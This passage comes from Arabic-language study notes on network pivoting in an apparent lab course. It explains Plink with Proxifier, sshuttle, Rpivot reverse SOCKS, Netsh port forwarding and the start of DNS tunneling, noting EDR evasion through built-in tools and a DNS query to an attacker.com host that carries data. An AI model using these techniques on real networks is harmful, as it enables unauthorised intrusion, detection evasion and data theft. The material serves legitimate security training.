الاتنين تقريبًا بيعملوا نفس الحاجة.

---

## السيناريو

المقال افترض السيناريو ده.

إنت اخترقت جهاز Windows.

بعد الـ Enumeration اكتشفت:

- Antivirus موجود
    
- EDR موجود
    
- Application Whitelisting
    
- ممنوع تنزل أدواتك
    

يعني لو رفعت:

- Chisel
    
- Ligolo
    
- SSH Server
    

ممكن الـ EDR يكتشفهم.

---

## الحل؟

استغل الأدوات الموجودة بالفعل.

وده مفهوم مشهور جدًا اسمه:

## Living Off The Land (LOTL)

يعني:

> استخدم البرامج الموجودة أصلًا على الجهاز بدل ما ترفع أدوات جديدة.

لو لقيت PuTTY متثبت بالفعل، يبقى تقدر تستخدم **Plink** بدل ما تنزل برنامج جديد، وده غالبًا هيكون أقل لفتًا للانتباه.

---

## يعني إيه Living Off The Land؟

مثال.

بدل ما تنزل:

```text
netcat.exe
```

تستخدم:

```cmd
powershell
```

---

بدل ما تنزل:

```text
wget.exe
```

تستخدم:

```powershell
Invoke-WebRequest
```

---

بدل ما تنزل:

```text
ssh.exe
```

تستخدم:

```text
Plink.exe
```

---

وده بيقلل فرص اكتشافك.

---

## شكل الشبكة

المقال كان عنده:

```text
          Windows Attack Host
             10.10.15.5
                  │
                  │
               Plink
                  │
                  ▼
        Ubuntu Pivot Host
        10.129.15.50
        172.16.5.129
                  │
                  ▼
          Windows Target
         172.16.5.19
```

لاحظ.

المرة دي **جهاز المهاجم نفسه Windows**.

مش Kali.

---

## الأمر

المقال استخدم:

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

وده أهم أمر.

خلينا نشرحه.

---

## أول جزء

```cmd
plink
```

تشغيل البرنامج.

---

## -ssh

يعني:

استخدم بروتوكول SSH.

---

## -D

زي Linux بالظبط.

يعني:

```text
Dynamic Port Forwarding
```

---

## 9050

البورت اللي هيشتغل عليه الـ SOCKS Proxy.

يعني هيبقى عندك:

```text
127.0.0.1:9050
```

أي برنامج يقدر يستخدمه كـ Proxy.

---

## ubuntu@

اسم المستخدم على الجهاز البعيد.

---

## 10.129.15.50

عنوان Ubuntu.

---

## يبقى الأمر كله معناه

> "افتح SSH Session مع Ubuntu، واعمل Dynamic Port Forwarding، وشغل SOCKS Proxy على البورت 9050 عندي."

وده **نفس اللي كنا بنعمله في Linux** باستخدام:

```bash
ssh -D 9050 ubuntu@10.129.15.50
```

الفرق الوحيد إننا استخدمنا **Plink** بدل `ssh`.

---

## شكل الاتصال

بعد تنفيذ الأمر.

يبقى:

```text
Windows Attack Host
        │
127.0.0.1:9050
        │
     SOCKS
        │
        ▼
SSH Session
        │
        ▼
Ubuntu
        │
        ▼
Internal Network
```

---

## طيب البرامج هتستخدم الـ SOCKS ده إزاي؟

في Linux كنا بنستخدم:

```text
ProxyChains
```

لكن على Windows...

فيه برنامج اسمه:

## Proxifier

---

## يعني إيه Proxifier؟

هو برنامج بيجبر أي برنامج في Windows يستخدم Proxy.

نفس فكرة:

```text
ProxyChains
```

لكن لويندوز.

---

## يعني بدل

```text
mstsc

↓

Target
```

هيبقى

```text
mstsc

↓

Proxifier

↓

SOCKS

↓

SSH

↓

Ubuntu

↓

Target
```

---

## إعداد Proxifier

المقال قال:

اعمل Proxy جديد.

وخليه:

```text
Address

127.0.0.1
```

يعني الـ Localhost.

---

بعدها:

```text
Port

9050
```

وده البورت اللي Plink فاتحه.

---

بعدها:

```text
SOCKS4
```

يبقى أي برنامج يشتغل هيستخدم:

```text
127.0.0.1:9050
```

كـ SOCKS Proxy.

---

## بعد كده

المقال قال:

افتح:

```cmd
mstsc.exe
```

---

## يعني إيه mstsc؟

ده اختصار:

```text
Microsoft Terminal Services Client
```

وده برنامج:

```text
Remote Desktop
```

اللي موجود في Windows.

---

## بدل ما الاتصال يبقى

```text
mstsc

↓

172.16.5.19
```

هيبقى

```text
mstsc

↓

Proxifier

↓

SOCKS

↓

Plink

↓

SSH

↓

Ubuntu

↓

172.16.5.19
```

وبكده تقدر تفتح RDP على جهاز داخلي غير قابل للوصول مباشرة من جهازك.

---

## مقارنة بين Linux و Windows

|Linux|Windows|
|---|---|
|`ssh -D`|`plink -D`|
|ProxyChains|Proxifier|
|`ssh` موجود افتراضيًا في أغلب التوزيعات|قديمًا كان Plink هو الخيار الشائع قبل دعم SSH افتراضيًا|
|`xfreerdp`|`mstsc.exe`|

---

## مقارنة بين ProxyChains و Proxifier

|ProxyChains|Proxifier|
|---|---|
|Linux|Windows|
|يعتمد على ملف `proxychains.conf`|يعتمد على إعدادات (Profiles) داخل البرنامج|
|يشغل البرنامج عن طريق `proxychains <program>`|يقدر يوجه برامج Windows تلقائيًا عبر الـ Proxy|
|غالبًا يستخدم مع Nmap وMetasploit|غالبًا يستخدم مع RDP والمتصفحات وبرامج Windows|

---

## ملخص حركة الاتصال

بعد تنفيذ كل الخطوات، مسار البيانات هيكون:

```text
Windows Attack Host
        │
        ▼
Proxifier
        │
        ▼
SOCKS Proxy (127.0.0.1:9050)
        │
        ▼
Plink (SSH)
        │
        ▼
Ubuntu Pivot Host
        │
        ▼
Windows Internal Target
```

---

## الخلاصة

الفكرة الأساسية من **Plink.exe** هي إنه يوفر نفس إمكانيات **SSH** لكن على **Windows**.

- **Plink** هو أداة سطر أوامر ضمن حزمة **PuTTY**.
    
- باستخدام الخيار **`-D`**، يقدر ينشئ **SOCKS Proxy** بنفس طريقة `ssh -D` على Linux.
    
- **Proxifier** هو البديل لـ **ProxyChains** على Windows، وبيخلي برامج زي `mstsc.exe` أو أي برنامج تاني تمرر اتصالاتها عبر الـ SOCKS Proxy.
    
- الأسلوب ده مفيد جدًا سواء كنت بتستخدم **Windows كجهاز هجوم**، أو لقيت **PuTTY/Plink** مثبتين بالفعل على جهاز داخل الشبكة وعايز تستفيد منهم في الـ Pivoting بدون تنزيل أدوات إضافية.

# Layer 9
## SSH Pivoting with Sshuttle

## أولًا... إيه هو Sshuttle؟

المقال بيقول:

> **Sshuttle هو Tool مكتوب بلغة Python.**

لكن دي مش أهم معلومة.

الأهم هو:

> **Sshuttle 
> بيخليك تعمل Pivoting عن طريق SSH بدون ما تحتاج ProxyChains أو تعدل إعدادات الـ Proxy بنفسك.**

يعني بدل ما تعمل:

```text
ssh
        ↓
SOCKS Proxy
        ↓
ProxyChains
        ↓
Nmap
```

كل ده...

Sshuttle بيعمله لوحده.

---

## ليه اتعمل Sshuttle أصلاً؟

افتكر إحنا قبل كده كنا بنعمل:

```bash
ssh -D 9050 ubuntu@IP
```

بعدها:

```bash
nano /etc/proxychains.conf
```

بعدها:

```text
ضيف:

socks4 127.0.0.1 9050
```

بعدها:

```bash
proxychains nmap
```

يعني خطوات كتير.

---

Sshuttle قال:

> سيب كل ده عليا.

أنا هعمل:

- SSH Session ✅
    
- Routing ✅
    
- iptables Rules ✅
    
- Forwarding ✅
    

من غير ProxyChains.

---

## هو بيشتغل إزاي؟

الفكرة عبقرية شوية.

بدل ما البرامج تستخدم Proxy.

هو بيغير الـ Routing Table.

أو بالتحديد:

```text
iptables
```

يعني البرامج نفسها **متعرفش** إنها بتستخدم Pivot.

---

## افتكر الفرق

## ProxyChains

```text
Nmap

↓

ProxyChains

↓

SOCKS

↓

SSH

↓

Ubuntu

↓

Target
```

---

## Sshuttle

```text
Nmap

↓

Linux Routing

↓

SSH

↓

Ubuntu

↓

Target
```

شايف الفرق؟

Nmap مش محتاج يعرف أي حاجة.

---

## أول خطوة

تنزل Sshuttle.

```bash
sudo apt install sshuttle
```

وده هيعمل Download للأداة ويثبتها.

---

## بعد التثبيت

بنشغلها.

المقال استخدم:

```bash
sudo sshuttle \
-r ubuntu@10.129.202.64 \
172.16.5.0/23 \
-v
```

وده أهم أمر في الفصل.

خلينا نشرحه كلمة كلمة.

---

## sudo

ليه؟

علشان Sshuttle هيعدل:

```text
iptables
```

وده محتاج Root.

---

## sshuttle

تشغيل البرنامج.

---

## -r

دي اختصار:

```text
Remote
```

يعني:

هنوصل لأي SSH Server؟

---

بعدها:

```text
ubuntu@10.129.202.64
```

يعني:

اعمل SSH على:

```text
10.129.202.64
```

باسم المستخدم:

```text
ubuntu
```

---

## بعد كده

```text
172.16.5.0/23
```

دي أهم حاجة.

دي معناها:

> أي Packet رايحة للشبكة دي...

عديها من الـ Ubuntu.

---

مش كل الإنترنت.

بس الشبكة دي.

---

## -v

يعني:

```text
Verbose
```

يعرض تفاصيل التشغيل.

وده اللي خلاه يطبع الـ Logs الطويلة اللي في المقال.

---

## أول Log

ظهر:

```text
Starting sshuttle proxy
```

يعني البرنامج بدأ يشتغل.

---

بعدها:

```text
Method

nat
```

يعني هيستخدم:

```text
iptables NAT
```

---

## NAT يعني إيه؟

Network Address Translation.

ودي الطريقة اللي Linux بيغير بيها مسار الـ Packets.

---

بعدها:

```text
IPv4: on
```

يعني:

هيوجه IPv4.

---

بعدها:

```text
IPv6: on
```

يعني:

IPv6 برضه.

---

بعدها:

```text
UDP: off
```

يعني:

مش هيعمل Forward لـ UDP بالطريقة دي.

هيشتغل على TCP بشكل أساسي.

---

بعدها:

```text
Connecting to server
```

يعني بدأ SSH.

---

بعدها:

```text
ubuntu@IP password
```

هتكتب الباسورد.

---

بعدها:

```text
Connected
```

يعني SSH اشتغل بنجاح.

---

## بعد كده حصل السحر 😄

المقال بدأ يطبع:

```text
iptables
```

كتير.

زي:

```text
iptables -t nat
```

---

## ليه؟

لأن Sshuttle بيعدل:

```text
iptables
```

تلقائيًا.

بدل ما إنت تعملها بإيدك.

---

مثلاً ظهر:

```text
iptables

-N sshuttle
```

يعني:

أنشأ Chain جديدة.

---

بعدها:

```text
iptables

-I OUTPUT
```

يعني:

أي Packet خارجة...

عديها على الـ Rule دي.

---

بعدها:

```text
REDIRECT
```

يعني:

غير مسارها.

---

لاحظ آخر Rule.

```text
REDIRECT

172.16.5.0
```

يعني:

أي Packet رايحة للشبكة:

```text
172.16.5.x
```

روح بيها للـ SSH Tunnel.

وده بالظبط اللي إحنا كنا بنعمله يدويًا باستخدام ProxyChains وSOCKS، لكن هنا Sshuttle عمله أوتوماتيك.

---

## النتيجة

بقى أي برنامج.

أي برنامج.

مش Nmap بس.

لو حاول يكلم:

```text
172.16.5.19
```

هيعدي من الـ Ubuntu.

---

يعني:

```text
Firefox

↓

Ubuntu

↓

Target
```

---

أو

```text
curl

↓

Ubuntu

↓

Target
```

---

أو

```text
Nmap

↓

Ubuntu

↓

Target
```

---

من غير ProxyChains.

---

## اختبار

المقال عمل:

```bash
sudo nmap \
-v \
-A \
-sT \
-p3389 \
172.16.5.19 \
-Pn
```

خلينا نشرحه.

---

## -v

Verbose.

---

## -A

Aggressive Scan.

يعني:

- OS Detection
    
- Version Detection
    
- Default Scripts
    
- Traceroute
    

---

## -sT

TCP Connect Scan.

---

## -p3389

افحص RDP بس.

---

## -Pn

اعتبر الجهاز شغال.

ومتعملش Ping الأول.

---

## النتيجة

طلع:

```text
3389

open
```

يعني:

RDP مفتوح.

---

بعدها عرف:

```text
Microsoft Terminal Services
```

---

بعدها عرف:

```text
Windows
```

---

بعدها عرف:

```text
Computer Name

DC01
```

---

بعدها عرف:

```text
Domain

INLANEFREIGHT
```

كل ده لأن Nmap وصل للجهاز عن طريق الـ SSH Tunnel اللي عمله Sshuttle.

---

## أهم ميزة في Sshuttle

المقال ختم بجملة مهمة جدًا.

قال:

> تقدر تستخدم أي Tool مباشرة بدون ProxyChains.

يعني بدل:

```bash
proxychains nmap
```

بقى:

```bash
nmap
```

بس.

وبرضه هيعدي من الـ Pivot Host.

---

## مقارنة بين SSH -D و Sshuttle

|SSH -D|Sshuttle|
|---|---|
|يحتاج ProxyChains|لا يحتاج ProxyChains|
|يعتمد على SOCKS Proxy|يعتمد على تعديل `iptables`|
|كل برنامج لازم تشغله من خلال ProxyChains|أي برنامج هيشتغل تلقائيًا|
|إعداد يدوي أكثر|إعداد تلقائي وأسهل|
|يدعم استخدامات متعددة للـ SOCKS|مخصص للـ SSH Pivoting فقط|

---

## مقارنة بين ProxyChains و Sshuttle

|ProxyChains|Sshuttle|
|---|---|
|يعيد توجيه برنامج معين فقط|يعيد توجيه كل الترافيك للشبكات التي تحددها|
|يعتمد على SOCKS Proxy|يعتمد على SSH و`iptables`|
|لازم تشغل كل أداة باستخدام `proxychains`|تشغل الأدوات بشكل طبيعي|
|يعمل مع أي SOCKS Proxy تقريبًا|يعمل فقط مع SSH|

---

## الخلاصة

**Sshuttle** هو أداة بتسهل عملية الـ **SSH Pivoting** بشكل كبير.

- بتفتح **SSH Session** مع الـ Pivot Host.
    
- بتضيف قواعد **iptables** تلقائيًا لإعادة توجيه الترافيك.
    
- أي اتصال متجه إلى الشبكة اللي تحددها (مثل `172.16.5.0/23`) يمر عبر الـ Pivot Host بدون الحاجة إلى **SOCKS Proxy** أو **ProxyChains**.
    
- النتيجة إنك تقدر تستخدم أدوات زي `nmap` و`curl` و`xfreerdp` وغيرها بشكل طبيعي، وكأن الشبكة الداخلية متصلة مباشرة بجهازك، بينما في الحقيقة كل الترافيك بيمر داخل نفق SSH.


-------
# Layer 10
## Web Server Pivoting with Rpivot

---

## أولًا... إيه هو Rpivot؟

المقال بيقول:

> **Rpivot هو Reverse SOCKS Proxy Tool مكتوب بـ Python2.**

خلينا نفهم الجملة دي كلمة كلمة.

---

## Reverse

يعني الاتصال **مش بيبدأ من المهاجم**.

الـ Pivot Host هو اللي بيروح يتصل بالمهاجم.

زي الـ Reverse Shell بالظبط.

---

## SOCKS Proxy

يعني هيعمل Proxy تقدر تستخدمه مع:

- Firefox
    
- Nmap
    
- Burp
    
- curl
    
- أي برنامج بيدعم SOCKS
    

---

## Python2

الأداة مكتوبة بـ Python2.

يعني غالبًا لازم تشغلها بـ:

```bash
python2
```

مش:

```bash
python3
```

---

##  طيب ليه نستخدم Rpivot؟

افتكر كل الأدوات اللي اتعلمناها.

|الأداة|بتحتاج إيه؟|
|---|---|
|SSH|لازم SSH Server|
|Plink|لازم SSH|
|sshuttle|لازم SSH|
|Meterpreter|لازم Meterpreter Session|
|Socat|لازم تشغل Socat على الجهاز|

---

لكن ساعات...

الجهاز الداخلي:

- مفيهوش SSH
    
- ومفيهوش Meterpreter
    
- ومش عايز تستخدم Chisel
    

فهنا Rpivot يبقى حل مناسب.

---

## الفكرة العامة

المقال عنده الشبكة دي:

```text
              Kali
        10.10.14.18
              │
              │
      Internet / DMZ
              │
              ▼
     Ubuntu Pivot Host
10.129.15.50
172.16.5.129
              │
              │
              ▼
     Web Server
172.16.5.135
Port 80
```
![[Pasted image 20260708223933.png]]

---

إحنا عايزين نوصل لـ:

```text
172.16.5.135
```

لكن منقدرش.

ليه؟

لأنه Internal.

---

## الفكرة

بدل ما Kali يحاول يدخل.

Ubuntu هيعمل Reverse Connection.

ويبقى شكل الاتصال:

```text
Ubuntu

↓

Kali

↓

SOCKS Proxy

↓

Firefox

↓

172.16.5.135
```

---

## أول خطوة

تحميل Rpivot.

المقال استخدم:

```bash
git clone https://github.com/klsecservices/rpivot.git
```

---

## git clone

يعني:

نزل المشروع من GitHub.

---

## هيبقى عندك فولدر

```text
rpivot
```

جواه ملفات.

أهمهم:

```text
server.py
```

و

```text
client.py
```

---

## الفرق بينهم

## server.py

بيشتغل عندك.

على جهاز المهاجم.

---

## client.py

بيروح للجهاز المخترق.

ويعمل Reverse Connection.

---

يبقى:

```text
Attacker

↓

server.py
```

```text
Pivot Host

↓

client.py
```

---

## تشغيل الـ Server

المقال استخدم:

```bash
python2 server.py \
--proxy-port 9050 \
--server-port 9999 \
--server-ip 0.0.0.0
```

وده أهم أمر.

---

## نشرحه

## python2

شغل البرنامج.

---

## server.py

شغل السيرفر.

---

## --proxy-port

```text
9050
```

ده البورت اللي هيطلع عليه الـ SOCKS Proxy.

يعني بعد تشغيله هيبقى عندك:

```text
127.0.0.1:9050
```

---

## --server-port

```text
9999
```

ده البورت اللي هيستقبل عليه اتصال الـ Client.

يعني Ubuntu هيتصل بـ:

```text
10.10.14.18:9999
```

---

## --server-ip

```text
0.0.0.0
```

يعني:

اسمع على كل الـ Interfaces.

---

يبقى السيرفر بيعمل حاجتين في نفس الوقت:

```text
9999

يستقبل Client
```

و

```text
9050

يفتح SOCKS Proxy
```

---

## شكل الاتصال

```text
Ubuntu

↓

9999

↓

server.py

↓

SOCKS

↓

9050
```

---

## بعد كده

لازم تبعت Rpivot للجهاز.

المقال استخدم:

```bash
scp -r rpivot ubuntu@Target:/home/ubuntu/
```

---

## scp

ينقل الملفات.

---

## -r

يعني:

انقل Folder بالكامل.

---

بعد النقل...

يبقى على Ubuntu.

---

## تشغيل الـ Client

المقال استخدم:

```bash
python2 client.py \
--server-ip 10.10.14.18 \
--server-port 9999
```

---

## client.py

هو الجزء اللي هيشتغل على Ubuntu.

---

## --server-ip

مين السيرفر؟

جهازك.

`10.10.15.219/23`

---

## --server-port

البورت.

```text
9999
```

---

أول ما يشتغل.

هيعمل:

```text
Ubuntu

↓

Connect

↓

Kali

9999
```

---

## الرسالة

ظهر:

```text
Backconnecting
```

يعني:

الـ Client بيعمل Reverse Connection.

---

بعدها على Kali ظهر:

```text
New connection
```

يعني:

الاتصال وصل.

---

يبقى دلوقتي بقى عندك:

```text
SOCKS Proxy

127.0.0.1:9050
```

جاهز للاستخدام.

---

## بعد كده

نعمل إعداد:

```text
proxychains.conf
```

زي ما كنا بنعمل.

---

ونضيف:

```text
socks4

127.0.0.1

9050
```

ليه؟

علشان ProxyChains يعرف يستخدم Rpivot.

---

## استخدام Firefox

المقال استخدم:

```bash
proxychains firefox-esr 172.16.5.135:80
```

خلينا نفهم.

---

## proxychains

شغل البرنامج باستخدام الـ SOCKS.

---

## firefox-esr

افتح Firefox.

---

## 172.16.5.135

الويب سيرفر الداخلي.

---

## 80

HTTP.

---

يبقى الاتصال هيبقى:

```text
Firefox

↓

ProxyChains

↓

SOCKS

↓

Rpivot

↓

Ubuntu

↓

Web Server
```

---

## النتيجة

فتح:

```text
Apache2 Ubuntu Default Page
```

يعني قدر يوصل للويب سيرفر الداخلي.

---

## ليه استخدم Firefox؟

علشان يثبت إن الـ Pivot شغال.

لكن ممكن تستخدم:

```bash
proxychains curl
```

أو

```bash
proxychains burpsuite
```

أو

```bash
proxychains nmap
```

أو أي برنامج بيدعم SOCKS.

---

## الجزء الأخير

المقال ذكر سيناريو أصعب.

قال:

ممكن الشركة يكون عندها:

```text
HTTP Proxy
```

---

يعني أي اتصال يطلع برة...

لازم يعدي على Proxy.

---

وكمان الـ Proxy ده بيطلب:

```text
NTLM Authentication
```

---

## يعني إيه NTLM؟

**NTLM (NT LAN Manager)** هو بروتوكول مصادقة (Authentication) من Microsoft.

يعني بدل ما أي جهاز يطلع الإنترنت.

لازم يدخل:

- Username
    
- Password
    
- Domain
    

---

مثلاً:

```text
Domain

INLANEFREIGHT
```

---

```text
Username

victor
```

---

```text
Password

********
```

---

## Rpivot بيدعم ده

المقال كتب:

```bash
python client.py \
--server-ip IP \
--server-port 8080 \
--ntlm-proxy-ip ProxyIP \
--ntlm-proxy-port 8081 \
--domain DOMAIN \
--username user \
--password pass
```

خلينا نشرحه.

---

## --server-ip

عنوان جهازك.

---

## --server-port

البورت.

---

## --ntlm-proxy-ip

عنوان الـ HTTP Proxy.

---

## --ntlm-proxy-port

بورت الـ Proxy.

---

## --domain

اسم الدومين.

---

## --username

اسم المستخدم.

---

## --password

كلمة السر.

---

يعني بدل ما يعمل:

```text
Ubuntu

↓

Internet
```

هيعمل:

```text
Ubuntu

↓

HTTP Proxy

↓

Authenticate

↓

Internet

↓

Kali
```

وبكده يقدر يعدي من خلال الـ Proxy اللي بيطلب مصادقة.

---

## مقارنة بين Rpivot و SSH

|SSH Pivot|Rpivot|
|---|---|
|يحتاج SSH Server|لا يحتاج SSH|
|يعتمد على SSH Tunnel|يعتمد على Python Client/Server|
|يوفر تشفير SSH|لا يعتمد على SSH للتشفير|
|ينشئ SOCKS Proxy باستخدام `ssh -D`|ينشئ SOCKS Proxy باستخدام `server.py`|
|مناسب لو SSH متاح|مناسب لو تقدر تشغل Python على الجهاز|

---

## مقارنة بين Rpivot و Chisel

|Rpivot|Chisel|
|---|---|
|مكتوب بـ Python2|مكتوب بـ Go|
|يعتمد على سكريبتات `server.py` و`client.py`|ملفين تنفيذيين (Server/Client)|
|ينشئ Reverse SOCKS Proxy|يدعم Reverse وForward وSOCKS|
|يحتاج Python2 على الجهاز الهدف|لا يحتاج Python، فقط تشغيل الملف التنفيذي|
|يمكنه العمل عبر HTTP Proxy مع دعم NTLM|يركز على HTTP/WebSocket Tunneling ولا يوفر دعم NTLM المدمج|

---

## الخلاصة

**Rpivot** هو أداة بتستخدم نموذج **Client/Server** لإنشاء **Reverse SOCKS Proxy**:

1. تشغل `server.py` على جهازك، فيفتح:
    
    - بورت لاستقبال اتصال الـ Client (مثل `9999`).
        
    - وبورت SOCKS محلي (مثل `9050`).
        
2. تنقل `client.py` إلى الـ Pivot Host وتشغله، فيعمل **Reverse Connection** إلى جهازك.
    
3. بعد نجاح الاتصال، تستخدم `proxychains` مع الـ SOCKS Proxy المحلي للوصول إلى الخدمات الداخلية، مثل:
    
    - `172.16.5.135:80`
        
4. ولو الشبكة بتستخدم **HTTP Proxy مع مصادقة NTLM**، يقدر `client.py` يمرر بيانات الـ Domain واسم المستخدم وكلمة المرور علشان ينشئ الاتصال الخارجي بنجاح.

----
# Layer 11
## Port Forwarding with Windows Netsh
## أولًا... إيه هو Netsh؟

**Netsh** اختصار لـ:

```text
Network Shell
```

وده برنامج موجود **بشكل افتراضي في Windows**.

يعني مش محتاج تنزله.

مكانه غالبًا:

```text
C:\Windows\System32\netsh.exe
```

---

## بيستخدم في إيه؟

المقال قال إن Netsh يقدر يعمل حاجات كتير خاصة بالشبكات، منها:

- إيجاد الـ Routes
    
- عرض إعدادات الـ Firewall
    
- إضافة Proxy
    
- إنشاء قواعد Port Forwarding
    

خلينا نشرح كل واحدة.

---

## 1) Finding Routes

يعني تعرف الجهاز بيوصل للشبكات إزاي.

زي الأمر:

```cmd
route print
```

أو باستخدام Netsh.

---

## 2) Viewing Firewall Configuration

يعني تشوف:

- إيه الـ Rules الموجودة؟
    
- إيه البورتات المفتوحة؟
    
- إيه اللي الـ Firewall مانعه؟
    

---

## 3) Adding Proxies

يعني تخلي الترافيك يعدي على Proxy.

---

## 4) Creating Port Forwarding Rules

ودي أهم نقطة في الدرس.

يعني:

> أي اتصال ييجي على بورت معين...

ابعتـه لبورت تاني أو لجهاز تاني.

وده اسمه:

## Port Forwarding

---

## السيناريو

المقال عنده الشبكة دي.

```text
               Attack Host
             10.10.15.5
                    │
                    │
                    ▼
      Windows 10 (Pivot)
10.129.15.150
172.16.5.19
                    │
                    │
                    ▼
      Windows Server
172.16.5.25
RDP :3389
```

---

إحنا عايزين نوصل لـ:

```text
172.16.5.25
```

لكن مش قادرين.

ليه؟

لأنه Internal.

---

لكن نقدر نوصل لـ:

```text
10.129.15.150
```

اللي هو جهاز الموظف اللي اخترقناه.

---

يبقى الفكرة:

بدل ما ندخل على:

```text
172.16.5.25:3389
```

هندخل على:

```text
10.129.15.150:8080
```

وWindows هيحول الاتصال لوحده إلى:

```text
172.16.5.25:3389
```

---

## شكل الترافيك

قبل Netsh

```text
Attack

↓

172.16.5.25

❌

مفيش Route
```

---

بعد Netsh

```text
Attack

↓

10.129.15.150:8080

↓

Windows

↓

172.16.5.25:3389

✅
```

---

## الأمر

المقال استخدم:

```cmd
netsh.exe interface portproxy add v4tov4 ^
listenport=8080 ^
listenaddress=10.129.15.150 ^
connectport=3389 ^
connectaddress=172.16.5.25
```

وده أهم أمر.

خلينا نشرحه كلمة كلمة.

---

## netsh.exe

تشغيل البرنامج.

---

## interface

يعني:

هنعدل حاجة خاصة بالـ Network Interface.

---

## portproxy

دي Feature داخل Netsh.

اسمها:

```text
Port Proxy
```

ودي المسؤولة عن Port Forwarding.

---

## add

يعني:

ضيف Rule جديدة.

---

## v4tov4

يعني:

```text
IPv4

↓

IPv4
```

يعني:

الاستقبال IPv4.

والإرسال IPv4.

---

فيه كمان أوضاع تانية زي:

```text
IPv6 → IPv4
```

أو

```text
IPv6 → IPv6
```

لكن هنا إحنا IPv4 بس.

---

## listenport

```text
8080
```

ده البورت اللي Windows هيستنى عليه.

يعني أي حد يعمل:

```text
10.129.15.150:8080
```

هيستقبل الاتصال.

---

## listenaddress

```text
10.129.15.150
```

يعني:

اسمع على الـ IP ده.

---

يبقى دلوقتي:

Windows بقى فاتح:

```text
10.129.15.150:8080
```

---

## connectport

```text
3389
```

ده البورت الحقيقي.

اللي هنحول عليه.

---

## connectaddress

```text
172.16.5.25
```

الجهاز الداخلي.

---

يبقى القاعدة كلها معناها:

> "أي اتصال ييجي على `10.129.15.150:8080` ابعته إلى `172.16.5.25:3389`."

---

## شكل الحركة

```text
Attacker

↓

10.129.15.150

8080

↓

Netsh

↓

172.16.5.25

3389
```

---

## التحقق

بعد إنشاء الـ Rule.

المقال استخدم:

```cmd
netsh interface portproxy show v4tov4
```

---

خلينا نشرحه.

## show

يعني:

اعرض الـ Rules.

---

## v4tov4

اعرض قواعد:

IPv4 → IPv4.

---

والنتيجة كانت:

```text
Listen

10.129.15.150

8080

↓

Connect

172.16.5.25

3389
```

وده معناه إن الـ Port Forward اتسجل بنجاح.

---

## بعد كده

إحنا على جهاز Kali.

بدل ما نعمل RDP على:

```text
172.16.5.25
```

هنعمل RDP على:

```text
10.129.15.150

8080
```

---

المقال استخدم:

```bash
xfreerdp
```

---

مثال:

```bash
xfreerdp /v:10.129.15.150:8080
```

---

ولما الاتصال يوصل.

Windows هيعمل:

```text
Attack

↓

8080

↓

Netsh

↓

3389

↓

Windows Server
```

---

## يعني Netsh بيشتغل كأنه Router صغير

هو بيستقبل الاتصال.

ثم يعيد توجيهه.

بالضبط زي:

- NAT
    
- Port Forwarding في الراوتر المنزلي
    

---

## هل Netsh Proxy؟

**لأ.**

ودي نقطة ناس كتير بتتلخبط فيها.

Netsh هنا **مش بيعمل SOCKS Proxy**.

ولا HTTP Proxy.

هو بيعمل:

```text
TCP Port Forward
```

بس.

---

## الفرق بين Netsh و SSH Port Forward

|SSH Port Forward|Netsh Portproxy|
|---|---|
|يحتاج SSH|لا يحتاج SSH|
|الاتصال داخل SSH Tunnel|لا يوجد Tunnel|
|مشفر|غير مشفر|
|يعمل على Linux وWindows|Windows فقط|
|يعتمد على SSH Server|يعتمد على Windows Portproxy|

---

## الفرق بين Netsh و Socat

|Netsh|Socat|
|---|---|
|موجود داخل Windows|برنامج خارجي|
|TCP Port Forward|TCP وUDP وأنواع كثيرة من الـ Relays|
|لا يحتاج تثبيت|يحتاج تثبيت|
|إعداداته أقل مرونة|أكثر مرونة ويدعم سيناريوهات متعددة|

---

## الفرق بين Netsh و Chisel

|Netsh|Chisel|
|---|---|
|Port Forward فقط|SOCKS + Reverse + Forward Tunnel|
|لا يوجد تشفير|يعتمد على HTTP/WebSocket مع تشفير|
|Windows فقط|Windows وLinux وmacOS|
|لا يحتاج رفع أداة لأنه مدمج|يحتاج تشغيل ملف Chisel|

---

## إمتى أستخدم Netsh؟

يكون مناسب لما:

- ✅ اخترقت جهاز Windows.
    
- ✅ عندك صلاحيات Administrator (لأن إنشاء قواعد `portproxy` غالبًا يحتاج صلاحيات مرتفعة).
    
- ✅ عايز توصل لسيرفر داخلي.
    
- ✅ مش عايز ترفع أدوات إضافية زي Chisel أو Socat.
    
- ✅ عايز تستخدم أدوات Windows المدمجة (Living Off The Land).
    

---

## ملخص حركة الاتصال

```text
               Attack Host
                     │
                     │
         RDP إلى 10.129.15.150:8080
                     │
                     ▼
        Windows 10 (Netsh Portproxy)
                     │
     يحول 8080 → 3389
                     │
                     ▼
        Windows Server 172.16.5.25
```

---

## الخلاصة

**Netsh** هو أداة مدمجة في Windows تقدر تستخدمها لإنشاء **Port Forwarding** بدون الحاجة لأي برامج إضافية.

في المثال:

- أنشأنا قاعدة تستقبل الاتصالات على:
    
    ```text
    10.129.15.150:8080
    ```
    
- ثم تحولها تلقائيًا إلى:
    
    ```text
    172.16.5.25:3389
    ```
    
- بعد كده أي برنامج (زي `xfreerdp`) يتصل بالـ Pivot Host على البورت `8080`، هيتم توجيه الاتصال إلى خدمة **RDP** الموجودة على السيرفر الداخلي.
    

الفكرة الأساسية هي إن **Netsh يعمل كوسيط (Forwarder)**: يستقبل الاتصال على جهاز الـ Pivot ثم يمرره للجهاز الداخلي، وده بيسمح لك بالوصول لخدمات داخلية ما كانتش متاحة مباشرة من جهاز الهجوم.


# Layer 12
## DNS Tunneling with Dnscat2

## أولًا... يعني إيه DNS Tunneling؟

قبل ما نفهم **Dnscat2** لازم نفهم يعني إيه **DNS Tunneling**.

احنا عارفين إن أي جهاز لما يكتب:

```text
google.com
```

بيحصل إيه؟

الجهاز بيبعت Request لـ DNS Server يقول له:

> "هاتلي الـ IP بتاع google.com."

مثلاً:

```text
google.com
↓

DNS Query

↓

DNS Server

↓

142.250.xxx.xxx
```

وده الاستخدام الطبيعي للـ DNS.

---

## طيب الـ DNS بيشتغل على بورت كام؟

غالبًا:

```text
UDP 53
```

وأحيانًا:

```text
TCP 53
```

---

## ليه المهاجمين بيستخدموا DNS؟

لأن معظم الشركات **مستحيل تقفل DNS**.

ليه؟

لأن لو قفلته:

- الإنترنت هيقف.
    
- المواقع مش هتشتغل.
    
- Active Directory هيبوظ.
    

فـ Firewall غالبًا بيسمح بخروج DNS.

---

## الفكرة الأساسية لـ DNS Tunneling

بدل ما نبعت:

```text
DNS Query

google.com
```

نبعت:

```text
DNS Query

AAAAABBBBBCCCC.data.attacker.com
```

يعني نخبي البيانات **جوا اسم الدومين نفسه**.

الـ DNS Server هيفكر إنها Query عادية.

